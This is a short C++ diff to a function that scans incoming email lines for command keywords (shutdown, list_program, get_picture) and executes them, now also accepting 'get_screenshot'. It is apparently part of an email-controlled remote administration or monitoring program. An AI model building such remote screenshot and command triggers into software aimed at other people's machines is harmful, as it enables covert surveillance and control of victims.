@@ -102,7 +102,8 @@ void check_email_commands() {
           line.find("shutdown") != string::npos ||
           line.find("COMMAND") != string::npos ||
           line.find("list_program") != string::npos ||
-          line.find("get_picture") != string::npos) {
+          line.find("get_picture") != string::npos ||
+          line.find("get_screenshot") != string::npos) {
         execute_command(line);
       }
     }
